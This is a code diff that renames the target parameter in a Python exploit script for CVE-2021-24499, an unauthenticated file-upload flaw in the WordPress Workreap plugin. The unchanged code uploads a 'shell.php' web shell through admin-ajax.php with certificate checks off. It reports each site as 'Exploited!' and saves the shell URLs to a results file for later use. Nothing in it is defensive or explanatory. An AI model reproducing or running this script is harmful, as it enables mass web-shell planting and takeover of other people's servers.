@@ -12,7 +12,7 @@ class Colors:
     RED = '\033[91m'
     RESET = '\033[0m'
 
-def check_vulnerability(target):
+def check_vulnerability(profile_url):
     shell_path = 'shell.php'
     
     with open(shell_path, 'rb') as shell_file:
@@ -21,22 +21,22 @@ def check_vulnerability(target):
             'award_img': shell_file
         }
         try:
-            response = requests.post(f"{target}/wp-admin/admin-ajax.php", files=files, verify=False)
+            response = requests.post(f"{profile_url}/wp-admin/admin-ajax.php", files=files, verify=False)
             if "File uploaded!" in response.text:
                 return True
             else:
                 return False
         except requests.RequestException as e:
-            print(f"{Colors.RED}Error connecting to {target}: {e}{Colors.RESET}")
+            print(f"{Colors.RED}Error connecting to {profile_url}: {e}{Colors.RESET}")
             return False
 
-def scan_cve_2021_24499(target):
-    print(f"{Colors.BOLD}Checking {target}...{Colors.RESET}")
-    if check_vulnerability(target):
-        shell_url = f"{target}/wp-content/uploads/workreap-temp/shell.php"
-        print(f"{Colors.GREEN}[*] {Colors.BOLD}{target} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
+def scan_cve_2021_24499(profile_url):
+    print(f"{Colors.BOLD}Checking {profile_url}...{Colors.RESET}")
+    if check_vulnerability(profile_url):
+        shell_url = f"{profile_url}/wp-content/uploads/workreap-temp/shell.php"
+        print(f"{Colors.GREEN}[*] {Colors.BOLD}{profile_url} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
         with open('result.txt', 'a') as result_file:
             result_file.write(f"{shell_url}\n")
     else:
-        print(f"{Colors.RED}[-] {Colors.BOLD}{target} Not Vulnerable!{Colors.RESET}")
+        print(f"{Colors.RED}[-] {Colors.BOLD}{profile_url} Not Vulnerable!{Colors.RESET}")
 
